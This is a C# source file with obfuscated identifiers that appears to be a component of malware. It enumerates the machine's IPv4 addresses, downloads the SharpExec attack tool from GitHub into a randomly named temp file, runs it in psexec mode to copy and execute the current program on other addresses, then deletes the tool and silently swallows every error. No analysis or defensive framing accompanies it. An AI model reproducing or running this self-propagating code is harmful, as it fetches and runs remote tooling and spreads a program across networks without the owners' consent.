using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;

namespace SNDBgbsWAO;

internal sealed class FSXKzYfwGkwUOE
{
	public static List<string> eWPQvysauWFE = new List<string>();

	public static string vyEuEAwfvqPy = "";

	public static void dniYIIETgpKvR()
	{
		try
		{
			eWPQvysauWFE = RnoLsAXmLJJ();
			string text = "";
			if (eWPQvysauWFE.Count > 0)
			{
				text = xlTDzdbsxWDL();
			}
			if (File.Exists(text))
			{
				foreach (string item in eWPQvysauWFE)
				{
					string text2 = (vyEuEAwfvqPy = item);
					foreach (string item2 in eWPQvysauWFE)
					{
						if (!(item2 == vyEuEAwfvqPy))
						{
							ahFIyKMEOzaLJ.QfLjyyZxVIa(text, "-m=psexec -i=" + vyEuEAwfvqPy + " -d=" + item2 + " -f=" + Assembly.GetEntryAssembly()!.Location + " -e=" + Path.Combine(Path.GetTempPath(), Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe"));
						}
					}
				}
			}
			File.Delete(text);
		}
		catch
		{
		}
	}

	public static List<string> RnoLsAXmLJJ()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string xlTDzdbsxWDL()
	{
		if (IntPtr.Size == 8)
		{
			return kTFnucUzQjz(new Uri("https://raw.githubusercontent.com/anthemtotheego/SharpExec/master/CompiledBinaries/SharpExec_x64.exe"));
		}
		return kTFnucUzQjz(new Uri("https://raw.githubusercontent.com/anthemtotheego/SharpExec/master/CompiledBinaries/SharpExec_x86.exe"));
	}

	public static string kTFnucUzQjz(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}
}
